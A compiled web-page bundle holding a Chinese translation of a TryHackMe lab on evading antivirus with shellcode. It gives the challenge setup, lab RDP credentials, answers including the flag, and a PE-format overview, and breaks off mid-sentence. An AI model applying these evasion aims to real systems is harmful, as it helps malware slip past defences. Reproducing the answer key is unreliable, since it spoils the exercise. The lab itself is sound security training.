"use strict";(self.webpackChunktryhackme_cn=self.webpackChunktryhackme_cn||[]).push([[6695],{138:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251134-113439-1c36b7cf5cde255908cadf075f4df411.png"},496:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251149-204902-6d6c86a41fb1286540508ee0dd221a4f.png"},575:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251110-191034-710ad3b00d828cbff025ad040e313c4f.png"},1009:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251107-190725-e4d1a7bcaa70cebf227a47a676245d15.png"},1160:(e,n,s)=>{s.d(n,{A:()=>l});const l=s.p+"assets/images/image_20251149-204920-5962a6b7f0ae8c5bc07dd0b0cd13f150.png"},1938:(e,n,s)=>{s.r(n),s.d(n,{assets:()=>c,contentTitle:()=>r,default:()=>h,frontMatter:()=>i,metadata:()=>l,toc:()=>t});const l=JSON.parse('{"id":"Modules/Host Evasions/avevasionshellcode","title":"AV \u89c4\u907f\uff1aShellcode","description":"\u4efb\u52a11 \u7b80\u4ecb","source":"@site/i18n/zh/docusaurus-plugin-content-docs/current/Modules/Host Evasions/avevasionshellcode.md","sourceDirName":"Modules/Host Evasions","slug":"/Modules/Host Evasions/avevasionshellcode","permalink":"/TryHackMe-CN/docs/Modules/Host Evasions/avevasionshellcode","draft":false,"unlisted":false,"editUrl":"https://github.com/TryHackMyOffsecBox/TryHackMe-CN/tree/main/packages/create-docusaurus/templates/shared/docs/Modules/Host Evasions/avevasionshellcode.md","tags":[],"version":"current","sidebarPosition":4,"frontMatter":{"sidebar_position":4},"sidebar":"tutorialSidebar","previous":{"title":"\u4e3b\u673a\u89c4\u907f","permalink":"/TryHackMe-CN/docs/Modules/Host Evasions/"},"next":{"title":"\u6df7\u6dc6\u539f\u7406","permalink":"/TryHackMe-CN/docs/Modules/Host Evasions/obfuscationprinciples"}}');var d=s(4848),x=s(8453);const i={sidebar_position:4},r="AV \u89c4\u907f\uff1aShellcode",c={},t=[{value:"\u4efb\u52a11 \u7b80\u4ecb",id:"\u4efb\u52a11-\u7b80\u4ecb",level:2},{value:"\u76ee\u6807",id:"\u76ee\u6807",level:3},{value:"\u5148\u51b3\u6761\u4ef6",id:"\u5148\u51b3\u6761\u4ef6",level:3},{value:"\u4efb\u52a1 2 \u6311\u6218",id:"\u4efb\u52a1-2-\u6311\u6218",level:2},{value:"\u4efb\u52a1 3 PE \u7ed3\u6784",id:"\u4efb\u52a1-3-pe-\u7ed3\u6784",level:2},{value:"\u4ec0\u4e48\u662f PE\uff1f",id:"\u4ec0\u4e48\u662f-pe",level:3},{value:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3PE\uff1f",id:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3pe",level:3},{value:"PE-Bear",id:"pe-bear",level:3},{value:"\u4efb\u52a14 Shellcode\u7b80\u4ecb",id:"\u4efb\u52a14-shellcode\u7b80\u4ecb",level:2},{value:"\u4e00\u4e2a\u7b80\u5355\u7684Shellcode",id:"\u4e00\u4e2a\u7b80\u5355\u7684shellcode",level:3},{value:"\u4efb\u52a15 \u751f\u6210Shellcode",id:"\u4efb\u52a15-\u751f\u6210shellcode",level:2},{value:"\u4f7f\u7528\u516c\u5171\u5de5\u5177\u751f\u6210Shellcode",id:"\u4f7f\u7528\u516c\u5171\u5de5\u5177\u751f\u6210shellcode",level:3},{value:"Shellcode\u6ce8\u5165",id:"shellcode\u6ce8\u5165",level:3},{value:"\u4eceEXE\u6587\u4ef6\u751f\u6210Shellcode",id:"\u4eceexe\u6587\u4ef6\u751f\u6210shellcode",level:3},{value:"\u4efb\u52a1 6 \u5206\u9636\u6bb5\u8f7d\u8377",id:"\u4efb\u52a1-6-\u5206\u9636\u6bb5\u8f7d\u8377",level:2},{value:"\u65e0\u9636\u6bb5\u8f7d\u8377",id:"\u65e0\u9636\u6bb5\u8f7d\u8377",level:3},{value:"\u5206\u9636\u6bb5\u8f7d\u8377",id:"\u5206\u9636\u6bb5\u8f7d\u8377",level:3},{value:"\u5206\u9636\u6bb5 vs. \u65e0\u9636\u6bb5",id:"\u5206\u9636\u6bb5-vs-\u65e0\u9636\u6bb5",level:3},{value:"Metasploit \u4e2d\u7684\u9636\u6bb5\u5668",id:"metasploit-\u4e2d\u7684\u9636\u6bb5\u5668",level:3},{value:"\u521b\u5efa\u60a8\u81ea\u5df1\u7684\u9636\u6bb5\u5668",id:"\u521b\u5efa\u60a8\u81ea\u5df1\u7684\u9636\u6bb5\u5668",level:3},{value:"\u4f7f\u7528\u6211\u4eec\u7684\u9636\u6bb5\u5668\u8fd0\u884c\u53cd\u5411 shell",id:"\u4f7f\u7528\u6211\u4eec\u7684\u9636\u6bb5\u5668\u8fd0\u884c\u53cd\u5411-shell",level:3},{value:"\u4efb\u52a1 7 \u7f16\u7801\u548c\u52a0\u5bc6\u7b80\u4ecb",id:"\u4efb\u52a1-7-\u7f16\u7801\u548c\u52a0\u5bc6\u7b80\u4ecb",level:2},{value:"\u4ec0\u4e48\u662f\u7f16\u7801\uff1f",id:"\u4ec0\u4e48\u662f\u7f16\u7801",level:3},{value:"\u4ec0\u4e48\u662f\u52a0\u5bc6\uff1f",id:"\u4ec0\u4e48\u662f\u52a0\u5bc6",level:3},{value:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3\u7f16\u7801\u548c\u52a0\u5bc6\uff1f",id:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3\u7f16\u7801\u548c\u52a0\u5bc6",level:3},{value:"\u4efb\u52a1 8 Shellcode \u7f16\u7801\u548c\u52a0\u5bc6",id:"\u4efb\u52a1-8-shellcode-\u7f16\u7801\u548c\u52a0\u5bc6",level:2},{value:"\u4f7f\u7528 MSFVenom \u8fdb\u884c\u7f16\u7801",id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u7f16\u7801",level:3},{value:"\u4f7f\u7528 MSFVenom \u8fdb\u884c\u52a0\u5bc6",id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u52a0\u5bc6",level:3},{value:"\u521b\u5efa\u81ea\u5b9a\u4e49 payload",id:"\u521b\u5efa\u81ea\u5b9a\u4e49-payload",level:3},{value:"\u7f16\u7801\u5668",id:"\u7f16\u7801\u5668",level:3},{value:"\u81ea\u89e3\u7801\u6709\u6548\u8f7d\u8377",id:"\u81ea\u89e3\u7801\u6709\u6548\u8f7d\u8377",level:3},{value:"\u4efb\u52a19 \u6253\u5305\u5668",id:"\u4efb\u52a19-\u6253\u5305\u5668",level:2},{value:"\u6253\u5305\u5e94\u7528\u7a0b\u5e8f",id:"\u6253\u5305\u5e94\u7528\u7a0b\u5e8f",level:3},{value:"\u6253\u5305\u5668\u548c\u9632\u75c5\u6bd2\u8f6f\u4ef6",id:"\u6253\u5305\u5668\u548c\u9632\u75c5\u6bd2\u8f6f\u4ef6",level:3},{value:"\u6253\u5305\u6211\u4eec\u7684shellcode",id:"\u6253\u5305\u6211\u4eec\u7684shellcode",level:3},{value:"\u90a3\u4e48\u6211\u4eec\u73b0\u5728\u8be5\u600e\u4e48\u529e\uff1f",id:"\u90a3\u4e48\u6211\u4eec\u73b0\u5728\u8be5\u600e\u4e48\u529e",level:3},{value:"\u4efb\u52a1 10 \u7ed1\u5b9a\u5668",id:"\u4efb\u52a1-10-\u7ed1\u5b9a\u5668",level:2},{value:"\u4f7f\u7528 msfvenom \u8fdb\u884c\u7ed1\u5b9a",id:"\u4f7f\u7528-msfvenom-\u8fdb\u884c\u7ed1\u5b9a",level:3},{value:"\u7ed1\u5b9a\u5668\u548c\u9632\u75c5\u6bd2\u8f6f\u4ef6",id:"\u7ed1\u5b9a\u5668\u548c\u9632\u75c5\u6bd2\u8f6f\u4ef6",level:3},{value:"\u4efb\u52a1 11 \u7ed3\u8bba",id:"\u4efb\u52a1-11-\u7ed3\u8bba",level:2}];function a(e){const n={a:"a",admonition:"admonition",code:"code",h1:"h1",h2:"h2",h3:"h3",header:"header",img:"img",li:"li",ol:"ol",p:"p",pre:"pre",strong:"strong",table:"table",tbody:"tbody",td:"td",th:"th",thead:"thead",tr:"tr",ul:"ul",...(0,x.R)(),...e.components},{Details:l}=n;return l||function(e,n){throw new Error("Expected "+(n?"component":"object")+" `"+e+"` to be defined: you likely forgot to import, pass, or provide it.")}("Details",!0),(0,d.jsxs)(d.Fragment,{children:[(0,d.jsx)(n.header,{children:(0,d.jsx)(n.h1,{id:"av-\u89c4\u907fshellcode",children:"AV \u89c4\u907f\uff1aShellcode"})}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a11-\u7b80\u4ecb",children:"\u4efb\u52a11 \u7b80\u4ecb"}),"\n",(0,d.jsx)(n.p,{children:"\u5728\u672c\u623f\u95f4\u4e2d\uff0c\u6211\u4eec\u5c06\u63a2\u8ba8\u5982\u4f55\u6784\u5efa\u548c\u4ea4\u4ed8\u6709\u6548\u8f7d\u8377\uff0c\u91cd\u70b9\u5728\u4e8e\u907f\u514d\u88ab\u5e38\u89c1 AV \u5f15\u64ce\u68c0\u6d4b\u5230\u3002 \u6211\u4eec\u5c06\u7814\u7a76\u4f5c\u4e3a\u653b\u51fb\u8005\u53ef\u7528\u7684\u4e0d\u540c\u6280\u672f\uff0c\u5e76\u8ba8\u8bba\u6bcf\u79cd\u6280\u672f\u7684\u4f18\u7f3a\u70b9\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u76ee\u6807",children:"\u76ee\u6807"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u4e86\u89e3 shellcode \u662f\u5982\u4f55\u5236\u4f5c\u7684\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u63a2\u7d22\u5206\u9636\u6bb5\u6709\u6548\u8f7d\u8377\u7684\u4f18\u7f3a\u70b9\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u521b\u5efa\u9690\u853d\u7684 shellcode \u4ee5\u907f\u514d AV \u68c0\u6d4b\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.h3,{id:"\u5148\u51b3\u6761\u4ef6",children:"\u5148\u51b3\u6761\u4ef6"}),"\n",(0,d.jsxs)(n.p,{children:["\u5efa\u8bae\u4e8b\u5148\u4e86\u89e3\u4e00\u4e9b",(0,d.jsx)(n.a,{href:"https://tryhackme.com/room/introtoav",children:"\u9632\u75c5\u6bd2\u8f6f\u4ef6\u7684\u5de5\u4f5c\u539f\u7406"}),"\u77e5\u8bc6\uff0c\u5e76\u5bf9\u52a0\u5bc6\u548c\u7f16\u7801\u6709\u57fa\u672c\u7406\u89e3\u3002 \u867d\u7136\u4e0d\u662f\u4e25\u683c\u8981\u6c42\uff0c\u4f46\u4e86\u89e3\u4e00\u4e9b\u57fa\u672c\u6c47\u7f16\u8bed\u8a00\u4e5f\u4f1a\u6709\u6240\u5e2e\u52a9\u3002 \u6b64\u5916\uff0c\u6211\u4eec\u5efa\u8bae\u5bf9\u9605\u8bfb\u4ee3\u7801\u548c\u7406\u89e3\u51fd\u6570\uff08C\u3001C#\uff09\u6709\u57fa\u672c\u4e86\u89e3\u3002"]}),"\n",(0,d.jsx)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u70b9\u51fb\u5e76\u7ee7\u7eed\u5b66\u4e60\uff01 "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"No answer needed\n"})})]})}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a1-2-\u6311\u6218",children:"\u4efb\u52a1 2 \u6311\u6218"}),"\n",(0,d.jsxs)(n.p,{children:["\u5728\u6b64\u6311\u6218\u4e2d\uff0c\u6211\u4eec\u51c6\u5907\u4e86\u4e00\u53f0 Windows \u673a\u5668\uff0c\u5e26\u6709\u4e00\u4e2a Web \u5e94\u7528\u7a0b\u5e8f\uff0c\u4f9b\u60a8\u4e0a\u4f20\u6709\u6548\u8f7d\u8377\u3002 \u4e00\u65e6\u4e0a\u4f20\uff0c\u6709\u6548\u8f7d\u8377\u5c06\u7531 AV \u68c0\u67e5\uff0c\u5982\u679c\u53d1\u73b0\u6ca1\u6709\u6076\u610f\u8f6f\u4ef6\uff0c\u5219\u4f1a\u88ab\u6267\u884c\u3002 \u6b64\u6311\u6218\u7684\u4e3b\u8981\u76ee\u6807\u662f\u89c4\u907f VM \u4e0a\u5b89\u88c5\u7684\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff0c\u5e76\u6355\u83b7\u6587\u4ef6\u7cfb\u7edf\u4e2d\u7684\u6807\u5fd7\u3002 \u8bf7\u968f\u610f\u5c1d\u8bd5\u672c\u623f\u95f4\u8ba8\u8bba\u7684\u6240\u6709\u6280\u672f\uff0c\u5c06\u5b83\u4eec\u4e0a\u4f20\u5230 ",(0,d.jsx)(n.code,{children:"http://MACHINE_IP/"}),"\u3002"]}),"\n",(0,d.jsx)(n.p,{children:"\u9700\u8bb0\u4f4f\u7684\u8981\u70b9\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u5c1d\u8bd5\u7ed3\u5408\u672c\u623f\u95f4\u8ba8\u8bba\u7684\u6280\u672f\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u8be5\u7f51\u7ad9\u4ec5\u652f\u6301 EXE \u6587\u4ef6\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u4e00\u65e6 AV \u626b\u63cf\u4e0a\u4f20\u7684\u6587\u4ef6\u4e14\u672a\u68c0\u6d4b\u5230\u6076\u610f\u4ee3\u7801\uff0c\u6587\u4ef6\u5c31\u4f1a\u88ab\u6267\u884c\u3002 \u56e0\u6b64\uff0c\u5982\u679c\u4e00\u5207\u6b63\u786e\u7ec4\u5408\uff0c\u60a8\u5e94\u8be5\u4f1a\u6536\u5230\u4e00\u4e2a\u53cd\u5411 shell\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"AV Challenge Web App",src:s(6542).A+"",width:"829",height:"757"})}),"\n",(0,d.jsx)(n.p,{children:"\u60a8\u73b0\u5728\u53ef\u4ee5\u5ffd\u7565\u6b64\u4efb\u52a1\u7684\u95ee\u9898\uff0c\u4f46\u8bf7\u52a1\u5fc5\u5728\u6210\u529f\u7ed5\u8fc7 AV \u5e76\u83b7\u5f97 shell \u540e\u8fd4\u56de\u56de\u7b54\u5b83\u4eec\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u90e8\u7f72\u9644\u52a0\u7684 VM \u4ee5\u8ddf\u8fdb\u623f\u95f4\u5185\u5bb9\uff0c\u7136\u540e\u518d\u7ee7\u7eed\u4e0b\u4e00\u90e8\u5206\uff01 VM \u5c06\u5728\u6d4f\u89c8\u5668\u4e2d\u90e8\u7f72\uff0c\u5e76\u5e94\u81ea\u52a8\u51fa\u73b0\u5728\u5206\u5c4f\u89c6\u56fe\u4e2d\u3002 \u5982\u679c VM \u4e0d\u53ef\u89c1\uff0c\u8bf7\u4f7f\u7528\u9875\u9762\u53f3\u4e0a\u89d2\u7684\u84dd\u8272\u663e\u793a\u5206\u5c4f\u89c6\u56fe\u6309\u94ae\u3002 \u5982\u679c\u60a8\u66f4\u559c\u6b22\u901a\u8fc7 RDP \u8fde\u63a5\uff0c\u53ef\u4ee5\u4f7f\u7528\u4ee5\u4e0b\u51ed\u636e\uff1a"}),"\n",(0,d.jsxs)(n.table,{children:[(0,d.jsx)(n.thead,{children:(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.th,{style:{textAlign:"center"},children:"Key"}),(0,d.jsx)(n.th,{style:{textAlign:"center"},children:"Value"})]})}),(0,d.jsxs)(n.tbody,{children:[(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"center"},children:"\u7528\u6237\u540d"}),(0,d.jsx)(n.td,{style:{textAlign:"center"},children:"thm"})]}),(0,d.jsxs)(n.tr,{children:[(0,d.jsx)(n.td,{style:{textAlign:"center"},children:"\u5bc6\u7801"}),(0,d.jsx)(n.td,{style:{textAlign:"center"},children:"Password321"})]})]})]}),"\n",(0,d.jsx)(n.p,{children:"\u60a8\u8fd8\u9700\u8981 AttackBox \u6765\u5b8c\u6210\u67d0\u4e9b\u4efb\u52a1\uff0c\u56e0\u6b64\u8fd9\u4e5f\u662f\u542f\u52a8\u5b83\u7684\u597d\u65f6\u673a\u3002"}),"\n",(0,d.jsxs)(n.admonition,{title:"\u56de\u7b54\u4ee5\u4e0b\u95ee\u9898",type:"info",children:[(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" VM \u4e0a\u8fd0\u884c\u7684\u662f\u54ea\u79cd\u9632\u75c5\u6bd2\u8f6f\u4ef6\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"Windows Defender\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u60a8\u53ef\u4ee5\u8bbf\u95ee\u7684\u7528\u6237\u5e10\u6237\u540d\u79f0\u662f\u4ec0\u4e48\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"av-victim\n"})})]}),(0,d.jsxs)(l,{children:[(0,d.jsx)("summary",{children:" \u5728\u53d7\u5bb3\u673a\u5668\u4e0a\u5efa\u7acb\u4e00\u4e2a\u53ef\u7528\u7684 shell \u5e76\u8bfb\u53d6\u7528\u6237\u684c\u9762\u4e0a\u7684\u6587\u4ef6\u3002 \u6807\u5fd7\u662f\u4ec0\u4e48\uff1f "}),(0,d.jsx)(n.pre,{children:(0,d.jsx)(n.code,{className:"language-plaintext",children:"THM{H3ll0-W1nD0ws-Def3nd3r!}\n"})})]})]}),"\n",(0,d.jsx)(n.h2,{id:"\u4efb\u52a1-3-pe-\u7ed3\u6784",children:"\u4efb\u52a1 3 PE \u7ed3\u6784"}),"\n",(0,d.jsx)(n.p,{children:"\u672c\u4efb\u52a1\u91cd\u70b9\u4ecb\u7ecd Windows \u4e8c\u8fdb\u5236\u6587\u4ef6 PE \u6570\u636e\u7ed3\u6784\u7684\u4e00\u4e9b\u9ad8\u7ea7\u57fa\u672c\u5143\u7d20\u3002"}),"\n",(0,d.jsx)(n.h3,{id:"\u4ec0\u4e48\u662f-pe",children:"\u4ec0\u4e48\u662f PE\uff1f"}),"\n",(0,d.jsx)(n.p,{children:"Windows \u53ef\u6267\u884c\u6587\u4ef6\u683c\u5f0f\uff0c\u53c8\u79f0 PE\uff08\u53ef\u79fb\u690d\u53ef\u6267\u884c\u6587\u4ef6\uff09\uff0c\u662f\u4e00\u79cd\u5305\u542b\u6587\u4ef6\u5fc5\u8981\u4fe1\u606f\u7684\u6570\u636e\u7ed3\u6784\u3002 \u5b83\u662f\u4e00\u79cd\u5728\u78c1\u76d8\u4e0a\u7ec4\u7ec7\u53ef\u6267\u884c\u6587\u4ef6\u4ee3\u7801\u7684\u65b9\u5f0f\u3002 Windows \u64cd\u4f5c\u7cfb\u7edf\u7ec4\u4ef6\uff0c\u5982 Windows \u548c DOS \u52a0\u8f7d\u5668\uff0c\u53ef\u4ee5\u5c06\u5176\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\uff0c\u5e76\u6839\u636e\u5728 PE \u4e2d\u627e\u5230\u7684\u89e3\u6790\u6587\u4ef6\u4fe1\u606f\u6267\u884c\u5b83\u3002"}),"\n",(0,d.jsx)(n.p,{children:"\u901a\u5e38\uff0cWindows \u4e8c\u8fdb\u5236\u6587\u4ef6\uff08\u5982 EXE\u3001DLL \u548c\u5bf9\u8c61\u4ee3\u7801\u6587\u4ef6\uff09\u7684\u9ed8\u8ba4\u6587\u4ef6\u7ed3\u6784\u5177\u6709\u76f8\u540c\u7684 PE \u7ed3\u6784\uff0c\u5e76\u5728 Windows \u64cd\u4f5c\u7cfb\u7edf\u4e2d\u9002\u7528\u4e8e\uff08x86 \u548c x64\uff09CPU \u67b6\u6784\u3002"}),"\n",(0,d.jsxs)(n.p,{children:["PE \u7ed3\u6784\u5305\u542b\u5404\u79cd\u90e8\u5206\uff0c\u8fd9\u4e9b\u90e8\u5206\u4fdd\u5b58\u6709\u5173\u4e8c\u8fdb\u5236\u6587\u4ef6\u7684\u4fe1\u606f\uff0c\u4f8b\u5982\u5143\u6570\u636e\u548c\u5916\u90e8\u5e93\u5185\u5b58\u5730\u5740\u7684\u94fe\u63a5\u3002 \u5176\u4e2d\u4e00\u4e2a\u90e8\u5206\u662f ",(0,d.jsx)(n.strong,{children:"PE \u5934"}),"\uff0c\u5b83\u5305\u542b\u5143\u6570\u636e\u4fe1\u606f\u3001\u6307\u9488\u4ee5\u53ca\u5185\u5b58\u4e2d\u5730\u5740\u90e8\u5206\u7684\u94fe\u63a5\u3002 \u53e6\u4e00\u4e2a\u90e8\u5206\u662f ",(0,d.jsx)(n.strong,{children:"\u6570\u636e\u90e8\u5206"}),"\uff0c\u5b83\u5305\u62ec\u5305\u542b Windows \u52a0\u8f7d\u5668\u8fd0\u884c\u7a0b\u5e8f\u6240\u9700\u4fe1\u606f\u7684\u5bb9\u5668\uff0c\u4f8b\u5982\u53ef\u6267\u884c\u4ee3\u7801\u3001\u8d44\u6e90\u3001\u5e93\u94fe\u63a5\u3001\u6570\u636e\u53d8\u91cf\u7b49\u3002"]}),"\n",(0,d.jsx)(n.p,{children:(0,d.jsx)(n.img,{alt:"PE Structure",src:s(2299).A+"",width:"762",height:"555"})}),"\n",(0,d.jsx)(n.p,{children:"PE \u7ed3\u6784\u4e2d\u6709\u4e0d\u540c\u7c7b\u578b\u7684\u6570\u636e\u5bb9\u5668\uff0c\u6bcf\u4e2a\u5bb9\u5668\u4fdd\u5b58\u4e0d\u540c\u7684\u6570\u636e\u3002"}),"\n",(0,d.jsxs)(n.ol,{children:["\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:".text"})," \u5b58\u50a8\u7a0b\u5e8f\u7684\u5b9e\u9645\u4ee3\u7801"]}),"\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:".data"})," \u4fdd\u5b58\u5df2\u521d\u59cb\u5316\u548c\u5b9a\u4e49\u7684\u53d8\u91cf"]}),"\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:".bss"})," \u4fdd\u5b58\u672a\u521d\u59cb\u5316\u7684\u6570\u636e\uff08\u5df2\u58f0\u660e\u4f46\u672a\u8d4b\u503c\u7684\u53d8\u91cf\uff09"]}),"\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:".rdata"})," \u5305\u542b\u53ea\u8bfb\u6570\u636e"]}),"\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:".edata"})," \u5305\u542b\u53ef\u5bfc\u51fa\u5bf9\u8c61\u53ca\u76f8\u5173\u8868\u4fe1\u606f"]}),"\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:".idata"})," \u5bfc\u5165\u7684\u5bf9\u8c61\u53ca\u76f8\u5173\u8868\u4fe1\u606f"]}),"\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:".reloc"})," \u6620\u50cf\u91cd\u5b9a\u4f4d\u4fe1\u606f"]}),"\n",(0,d.jsxs)(n.li,{children:[(0,d.jsx)(n.strong,{children:".rsrc"})," \u94fe\u63a5\u7a0b\u5e8f\u4f7f\u7528\u7684\u5916\u90e8\u8d44\u6e90\uff0c\u5982\u56fe\u50cf\u3001\u56fe\u6807\u3001\u5d4c\u5165\u5f0f\u4e8c\u8fdb\u5236\u6587\u4ef6\u548c\u6e05\u5355\u6587\u4ef6\uff0c\u5176\u4e2d\u5305\u542b\u6709\u5173\u7a0b\u5e8f\u7248\u672c\u3001\u4f5c\u8005\u3001\u516c\u53f8\u548c\u7248\u6743\u7684\u6240\u6709\u4fe1\u606f\uff01"]}),"\n"]}),"\n",(0,d.jsx)(n.p,{children:"PE \u7ed3\u6784\u662f\u4e00\u4e2a\u5e7f\u6cdb\u800c\u590d\u6742\u7684\u4e3b\u9898\uff0c\u6211\u4eec\u4e0d\u4f1a\u8fc7\u591a\u6d89\u53ca\u5934\u548c\u6570\u636e\u90e8\u5206\u7684\u7ec6\u8282\u3002 \u672c\u4efb\u52a1\u63d0\u4f9b\u4e86 PE \u7ed3\u6784\u7684\u9ad8\u7ea7\u6982\u8ff0\u3002 \u5982\u679c\u60a8\u6709\u5174\u8da3\u83b7\u53d6\u6709\u5173\u8be5\u4e3b\u9898\u7684\u66f4\u591a\u4fe1\u606f\uff0c\u6211\u4eec\u5efa\u8bae\u67e5\u770b\u4ee5\u4e0b THM \u623f\u95f4\uff0c\u5176\u4e2d\u66f4\u8be6\u7ec6\u5730\u89e3\u91ca\u4e86\u8be5\u4e3b\u9898\uff1a"}),"\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:(0,d.jsx)(n.a,{href:"https://tryhackme.com/room/windowsinternals",children:"Windows Internals"})}),"\n",(0,d.jsx)(n.li,{children:"\u5256\u6790 PE \u5934"}),"\n"]}),"\n",(0,d.jsxs)(n.p,{children:["\u5982\u679c\u60a8\u67e5\u770b ",(0,d.jsx)(n.a,{href:"https://docs.microsoft.com/en-us/windows/win32/debug/pe-format",children:"Windows PE \u683c\u5f0f"}),"\u7684\u6587\u6863\u7f51\u7ad9\uff0c\u4e5f\u53ef\u4ee5\u83b7\u5f97\u66f4\u6df1\u5165\u7684 PE \u7ec6\u8282\u3002"]}),"\n",(0,d.jsx)(n.p,{children:"\u67e5\u770b PE \u5185\u5bb9\u65f6\uff0c\u6211\u4eec\u4f1a\u770b\u5230\u5b83\u5305\u542b\u4e00\u5806\u4eba\u7c7b\u4e0d\u53ef\u8bfb\u7684\u5b57\u8282\u3002 \u4f46\u662f\uff0c\u5b83\u5305\u542b\u4e86\u52a0\u8f7d\u5668\u8fd0\u884c\u6587\u4ef6\u6240\u9700\u7684\u6240\u6709\u7ec6\u8282\u3002 \u4ee5\u4e0b\u662f Windows \u52a0\u8f7d\u5668\u8bfb\u53d6\u53ef\u6267\u884c\u4e8c\u8fdb\u5236\u6587\u4ef6\u5e76\u5c06\u5176\u4f5c\u4e3a\u8fdb\u7a0b\u8fd0\u884c\u7684\u793a\u4f8b\u6b65\u9aa4\u3002"}),"\n",(0,d.jsxs)(n.ol,{children:["\n",(0,d.jsxs)(n.li,{children:["\u5934\u90e8\u5206\uff1a\u89e3\u6790 DOS\u3001Windows \u548c\u53ef\u9009\u5934\u4ee5\u63d0\u4f9b\u6709\u5173 EXE \u6587\u4ef6\u7684\u4fe1\u606f\u3002 \u4f8b\u5982\uff0c","\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:'\u5e7b\u6570\u4ee5 "MZ" \u5f00\u5934\uff0c\u8fd9\u544a\u8bc9\u52a0\u8f7d\u5668\u8fd9\u662f\u4e00\u4e2a EXE \u6587\u4ef6\u3002'}),"\n",(0,d.jsx)(n.li,{children:"\u6587\u4ef6\u7b7e\u540d"}),"\n",(0,d.jsx)(n.li,{children:"\u6587\u4ef6\u662f\u4e3a x86 \u8fd8\u662f x64 CPU \u67b6\u6784\u7f16\u8bd1\u7684\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u521b\u5efa\u65f6\u95f4\u6233\u3002"}),"\n"]}),"\n"]}),"\n",(0,d.jsxs)(n.li,{children:["\u89e3\u6790\u8282\u8868\u7ec6\u8282\uff0c\u4f8b\u5982","\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u6587\u4ef6\u5305\u542b\u7684\u8282\u6570\u3002"}),"\n"]}),"\n"]}),"\n",(0,d.jsxs)(n.li,{children:["\u57fa\u4e8e\u5165\u53e3\u70b9\u5730\u5740\u548c\u6620\u50cf\u57fa\u5740\u7684\u504f\u79fb\u91cf\u5c06\u6587\u4ef6\u5185\u5bb9\u6620\u5c04\u5230\u5185\u5b58\u4e2d\u3002","\n",(0,d.jsxs)(n.ul,{children:["\n",(0,d.jsx)(n.li,{children:"\u5165\u53e3\u70b9\u5730\u5740\u548c\u6620\u50cf\u57fa\u5740\u7684\u504f\u79fb\u91cf\u3002"}),"\n",(0,d.jsx)(n.li,{children:"RVA\uff1a\u76f8\u5bf9\u865a\u62df\u5730\u5740\uff0c\u4e0e\u6620\u50cf\u57fa\u5740\u76f8\u5173\u7684\u5730\u5740\u3002"}),"\n"]}),"\n"]}),"\n",(0,d.jsx)(n.li,{children:"\u5bfc\u5165\u9879\u3001DLL\u548c\u5176\u4ed6\u5bf9\u8c61\u88ab\u52a0\u8f7d\u5230\u5185\u5b58\u4e2d\u3002"}),"\n",(0,d.jsx)(n.li,{children:"\u5b9a\u4f4d\u5165\u53e3\u70b9\u5730\u5740\u5e76\u8fd0\u884c\u4e3b\u6267\u884c\u51fd\u6570\u3002"}),"\n"]}),"\n",(0,d.jsx)(n.h3,{id:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3pe",children:"\u4e3a\u4ec0\u4e48\u6211\u4eec\u9700\u8981\u4e86\u89e3PE\uff1f"}),"\n",(0,d.jsx)(n.p,{children:"\u6211\u4eec\u9700\u8981\u5b66\u4e60\u5b83\u6709\u51e0\u4e2a\u539f\u56e0\u3002 